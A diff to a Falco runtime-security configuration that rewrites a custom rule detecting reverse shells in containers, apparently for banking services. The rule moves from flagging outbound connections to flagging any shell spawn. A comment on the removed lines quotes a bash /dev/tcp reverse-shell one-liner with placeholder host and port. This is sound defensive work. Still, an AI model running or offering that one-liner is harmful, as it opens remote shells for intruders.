@@ -3,26 +3,26 @@
 driver:
   kind: modern_ebpf
 
-# Custom rule for attack #6: a shell process inside a container opening an
-# outbound network connection is the classic reverse-shell technique
-# (e.g. `bash -i >& /dev/tcp/<ip>/<port> 0>&1`). Reuses the default
-# `container` macro and `shell_binaries` list shipped with the Falco rules.
+# Custom rule for attack #6: a shell process being spawned inside a container.
+# The application images are hardened (Alpine + JRE, no bash/nc), so an attacker
+# who gains code execution must spawn a shell (/bin/sh) to get interactive
+# access — which is exactly what a reverse shell does first. Detecting the
+# shell spawn catches the attack reliably on the real, hardened pod. Reuses the
+# default `spawned_process` / `container` macros and `shell_binaries` list.
 customRules:
   reverse-shell.yaml: |-
-    - rule: Reverse Shell In Container
+    - rule: Shell Spawned In Container
       desc: >
-        A shell process running inside a container initiated an outbound
-        network connection, a common reverse-shell technique used after
-        a container compromise.
+        A shell process was started inside a running container. The banking
+        services never spawn a shell at runtime, so this indicates an
+        interactive/reverse shell following a container compromise.
       condition: >
-        evt.type = connect and evt.dir = <
+        spawned_process
         and container
-        and fd.typechar = 4
         and proc.name in (shell_binaries)
       output: >
-        Reverse shell detected in container
+        Shell spawned in container
         (user=%user.name container=%container.name image=%container.image.repository
-        shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline
-        connection=%fd.name)
+        shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline)
       priority: CRITICAL
-      tags: [container, network, mitre_execution, T1059]
+      tags: [container, process, mitre_execution, T1059]
